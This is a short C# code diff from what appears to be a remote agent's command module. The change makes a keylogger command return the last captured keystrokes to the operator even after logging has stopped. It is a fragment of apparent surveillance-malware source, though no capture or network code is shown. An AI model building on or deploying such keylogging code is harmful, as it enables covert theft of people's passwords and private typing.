@@ -4,7 +4,6 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using System.Windows.Input;
 using System.Runtime.InteropServices;
 using System.IO;
 using System.Threading;
@@ -53,7 +52,11 @@ namespace Agent.Commands
                 context.AppendResult(this.Service.LoggedKeyStrokes);
             }
             else
+            {
                 context.AppendResult("Key Logger is stopped!");
+                context.AppendResult("Last Capture :");
+                context.AppendResult(this.Service.LoggedKeyStrokes);
+            }
             return;
         }
     }
